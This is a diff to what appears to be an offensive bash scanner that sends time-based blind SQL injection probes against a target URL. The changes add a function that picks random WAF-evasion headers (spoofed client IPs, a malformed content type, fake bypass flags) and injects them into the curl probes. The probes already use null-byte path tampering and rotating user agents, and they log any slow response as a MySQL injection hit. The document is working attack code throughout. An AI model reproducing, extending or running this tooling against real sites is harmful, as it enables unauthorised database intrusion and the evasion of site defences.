@@ -55,6 +55,15 @@ print_defiance_logo() {
     fi
 }
 
+braindamage() {
+    local choice=$((RANDOM % 3))
+    case "$choice" in
+        0) echo "-H X-Forwarded-For:127.0.0.1 -H X-Real-IP:10.0.0.$((RANDOM % 254 + 1))" ;;
+        1) echo "-H Content-Type:application/json;multipart/form-data;boundary=$((RANDOM % 9999))" ;;
+        2) echo "-H X-WAF-Bypass:True -H X-Safe-Behavior:Active -H Cache-Control:no-transform" ;;
+    esac
+}
+
 vector_sqli_agressor_left() {
     local agressor_ua="Mozilla/5.0 (Linux; Android 10; Termux_Agresor_L1)"
 
@@ -73,11 +82,12 @@ vector_sqli_agressor_left() {
         local defiance_tamper_path=$(appendnullbyte_engine "$t5")
         
         local final_query="${defiance_tamper_path}${query_payload}"
-        
+        local waf_trick=$(braindamage)
+
         echo -e "\e[0;33m[ \e[0m:\e[0;34m) ]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[0;34m$target_url$final_query\e[0m"
         
-        local stopwatch=$(curl $proxy_flag -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
-        
+        local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
+
         if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
             echo -e "    \e[0;31m[!+!]\e[0m Vector 1 MySQL Anomaly: ${stopwatch}s"
             echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
@@ -104,10 +114,11 @@ vector_sqli_agressor_right() {
         local defiance_tamper_path=$(appendnullbyte_engine "$t5")
         
         local final_query="${defiance_tamper_path}${query_payload}"
-        
+        local waf_trick=$(braindamage)
+
         echo -e "\e[0;33m[ \e[0m:\e[0;34m) ]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[0;34m$target_url$final_query\e[0m"
         
-        local stopwatch=$(curl $proxy_flag -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
+        local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
         
         if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
             echo -e "    \e[0;31m[!+!]\e[0m Vector 2 MySQL Anomaly: ${stopwatch}s"
